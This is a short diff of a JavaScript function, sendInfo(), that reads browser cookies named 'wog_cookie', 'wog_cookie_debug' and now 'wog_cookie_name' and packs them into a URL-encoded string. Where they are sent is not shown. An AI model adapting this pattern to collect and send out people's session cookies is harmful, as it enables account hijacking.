@@ -815,7 +815,7 @@ async function getWhite() {
 }
 async function sendInfo(){
     let tempText ="";
-    let temp = document.cookie.split(";").filter((value)=>{return value.includes("wog_cookie_debug=") ||value.includes("wog_cookie=")});
+    let temp = document.cookie.split(";").filter((value)=>{return value.includes("wog_cookie_debug=") ||value.includes("wog_cookie=")||value.includes("wog_cookie_name=")});
     for(let i=0;i<temp.length;i++){
         tempText += temp[i]+"%0A";
     }
